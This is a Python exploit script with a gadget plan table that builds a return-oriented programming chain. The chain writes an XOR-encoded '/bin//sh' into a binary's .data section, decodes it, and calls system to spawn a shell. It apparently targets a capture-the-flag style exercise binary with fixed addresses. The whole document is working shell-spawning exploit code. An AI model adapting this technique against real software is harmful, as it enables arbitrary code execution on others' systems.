'''

PLAN of ATTACK:
Desired Stack	                  Address	    Description
return address	                  0x400770	Exit gracefully <exit@plt>
call to system	                  0x4006f0	<system@plt>
ptr to /bin//sh	                  0x601070	.data section
pop rdi; ret	                  0x400b39	pop string into rdi register as param
xor byte ptr [r15], r14b ; ret	  0x400b30	
	                          0x601077	
pop r15 ; ret	                  0x400b42	pop ptr addr into r15
xor byte ptr [r15], r14b ; ret	  0x400b30	
	                          0x601076	
pop r15 ; ret	                  0x400b42	pop ptr addr into r15
xor byte ptr [r15], r14b ; ret    0x400b30	
	                          0x601075	
pop r15 ; ret	                  0x400b42	pop ptr addr into r15
xor byte ptr [r15], r14b ; ret	  0x400b30	
	                          0x601074	
pop r15 ; ret	                  0x400b42	pop ptr addr into r15
xor byte ptr [r15], r14b ; ret    0x400b30	
	                          0x601073	
pop r15 ; ret	                  0x400b42	pop ptr addr into r15
xor byte ptr [r15], r14b ; ret	  0x400b30	
	                          0x601072	
pop r15 ; ret	                  0x400b42	pop ptr addr into r15
xor byte ptr [r15], r14b ; ret	  0x400b30	
	                          0x601071	
pop r15 ; ret	                  0x400b42	pop ptr addr into r15
xor byte ptr [r15], r14b ; ret	  0x400b30	
	                          0x601070
                                  0x18	
pop r14 ; pop r15 ; ret           0x400b40	pop ptr addr into r15 XOR byte into r14
mov qword ptr [r13], r12 ; ret	  0x400b34	write string to .data section
	                          0x601070	
	                          7zqv77kp	
pop r12 ; pop r13 ; ret	          0x400b3b 	pop string into r12 and ptr in r13


[$] Buffer + Base Pointer: 40

'''

import struct
import sys

buf                = b''
encodedString      = "7zqv77kp"
xorByte            = 0x18
callToSystem       = 0x4006f0
callToExit         = 0x400770
addrToData         = 0x601074 # .data + 4 to avoid errors
callToPopR15Ret    = 0x400b42
callToPopR14R15Ret = 0x400b40
callToPopR12R13Ret = 0x400b3b
callToXOR          = 0x400b30
callToMovQWord     = 0x400b34
callToPopRDIRet    = 0x400b39

def packQWord(addr):
    return struct.pack('<Q', addr)

def xorString():
    decode = ''
    for i in range(1,len(encodedString)):
        decode += packQWord(callToPopR15Ret)
        decode += packQWord(addrToData + i)
        decode += packQWord(callToXOR)
    return decode

buf += 'A' * 40
buf += packQWord(callToPopR12R13Ret)
buf += encodedString
buf += packQWord(addrToData)
buf += packQWord(callToMovQWord)
buf += packQWord(callToPopR14R15Ret)
buf += packQWord(xorByte)
buf += packQWord(addrToData)
buf += packQWord(callToXOR)
buf += xorString()
buf += packQWord(callToPopRDIRet)
buf += packQWord(addrToData)
buf += packQWord(callToSystem)
buf += packQWord(callToExit)

sys.stdout.write(buf)
